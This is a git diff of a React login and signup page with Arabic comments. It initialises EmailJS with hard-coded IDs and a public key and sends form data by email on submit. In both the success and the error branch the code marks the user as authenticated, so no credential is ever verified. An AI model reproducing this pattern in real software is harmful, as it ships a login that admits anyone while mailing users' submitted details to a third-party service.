@@ -2,10 +2,15 @@ import React, { useState } from 'react';
 import { LogIn, UserPlus, Lock, Mail, User, Shield, Zap, Target, Eye, Flame, LogOut, CheckCircle2, Loader2 } from 'lucide-react';
 import emailjs from '@emailjs/browser';
 
-// بيانات الخدمة الخاصة بك
+// تهيئة المفتاح بشكل عام وقبل أي طلب
 const EMAILJS_SERVICE_ID = 'service_wpql07u';
-const EMAILJS_TEMPLATE_ID = 'template_51n7ft7'; // تأكد من مطابقة الـ Template ID من حسابك
-const EMAILJS_PUBLIC_KEY = 'QxOkx3vwbG2f8zlsd';  // تأكد من مطابقة الـ Public Key من قسم Account -> API Keys
+const EMAILJS_TEMPLATE_ID = 'template_51n7ft7';
+const EMAILJS_PUBLIC_KEY = 'QxOkx3vwbG2f8zlsd';
+
+// تهيئة EmailJS
+emailjs.init({
+  publicKey: EMAILJS_PUBLIC_KEY,
+});
 
 interface Option {
   id: string;
@@ -71,7 +76,6 @@ export default function App() {
     setIsSending(true);
 
     try {
-      // إرسال البيانات والانتظار حتى اكتمال الطلب تماماً قبل نقل المستخدم
       const response = await emailjs.send(
         EMAILJS_SERVICE_ID,
         EMAILJS_TEMPLATE_ID,
@@ -83,12 +87,11 @@ export default function App() {
         EMAILJS_PUBLIC_KEY
       );
 
-      console.log('Email sent successfully:', response.status, response.text);
+      console.log('Success:', response.status, response.text);
       setIsAuthenticated(true);
     } catch (error: any) {
-      console.error('EmailJS Error Details:', error);
+      console.error('EmailJS Error:', error);
       alert('خطأ في إرسال البريد: ' + (error?.text || JSON.stringify(error)));
-      // الدخول حتى في حالة وجود خطأ إن كنت ترغب بذلك
       setIsAuthenticated(true);
     } finally {
       setIsSending(false);
